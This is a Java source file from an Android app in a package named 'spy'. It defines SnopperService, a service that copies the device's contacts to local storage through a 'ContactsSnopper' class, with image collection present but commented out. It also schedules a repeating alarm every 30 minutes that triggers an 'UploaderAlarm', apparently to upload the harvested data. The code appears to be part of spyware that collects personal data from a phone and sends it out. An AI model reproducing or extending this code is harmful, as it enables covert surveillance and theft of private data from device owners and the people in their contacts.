package com.gameofcoding.spy.services;

import java.io.File;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import com.gameofcoding.spy.spys.ContactsSnopper;
import com.gameofcoding.spy.io.DataFilePaths;
import com.gameofcoding.spy.spys.ImagesSnopper;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.receivers.UploaderAlarm;
import com.gameofcoding.spy.utils.NotificationUtils;
import com.gameofcoding.spy.utils.XLog;

public class SnopperService extends Service {
    private static final String TAG = "SnopperService";
    private static final int UPLOADER_ALARM_ID = 100;
    private static final int SNOPPER_SERVICE_NOTIF_ID = 101;
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "SnopperService has been started, preparing for loading data.");
	mContext = getApplicationContext();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	updateForegroundNotif("Starting...");
	saveData();
	updateForegroundNotif("Finishing...");

	// Start alarm that repeats after 30 mins. for uploading changes
	AlarmManager alarmManager = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
	PendingIntent pendingIntent = PendingIntent
	    .getBroadcast(mContext, UPLOADER_ALARM_ID, new Intent(mContext, UploaderAlarm.class), 0);
	alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
				  (1000 * 60) * 30, pendingIntent);
	// Stop service
	stopForeground(true);
	stopSelf();
	return START_STICKY;
    }

    public void saveData() {
	try {
	    DataFilePaths dataFilePaths = DataFilePaths.loadPaths(mContext);
	    File userDataDir = dataFilePaths.getUserDataDir();
	    File othersDir = dataFilePaths.getOthersDir();
	    
	    // Store user data
	    XLog.i(TAG, "saveData(): Loading contacts...");
	    updateForegroundNotif("Loading contacts...");
	    new ContactsSnopper(mContext, new File(userDataDir, ContactsSnopper.CONTACTS_FILE_NAME))
		.snoop();
	    // updateForegroundNotif("Loading images...");
	    // new ImagesSnopper(mContext, new File(userDataDir, ImagesSnopper.IMAGES_DIR_NAME))
	    // 	.snoop();

	    // Store app logs
	    // TODO: Fixme chanage getExternalcachedir() > getFilesDir();
	    XLog.i(TAG, "saveData(): Loading logs...");
	    updateForegroundNotif("Loading logs...");
	    File logFile = new File(getExternalCacheDir(), XLog.LOG_FILE_NAME);
	    if(!logFile.renameTo(new File(othersDir, logFile.getName()))) {
	     	XLog.w(TAG, "Failed to move log file from=" + othersDir + logFile.getName()
	     	       + ", to=" + logFile);
	    }
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occurred in while saving data.", e);
	}
    }

    @SuppressWarnings("deprecation")
    public void updateForegroundNotif(String contentText) {
	Notification.Builder notifBuilder = null;
	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	    NotificationUtils notifUtils = new NotificationUtils(mContext);
	    notifUtils.createDefaultNotifChannel();
	    String channelID = notifUtils.getDefaultNotifChannelId();
	    notifBuilder = new Notification.Builder(mContext, channelID);
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	}

	// Start foreground notification
	notifBuilder.setSmallIcon(R.mipmap.ic_launcher)
	    .setContentTitle(getString(R.string.snopperservice_notif_content_title))
	    .setContentText(contentText);
	startForeground(SNOPPER_SERVICE_NOTIF_ID, notifBuilder.build());
    }
}
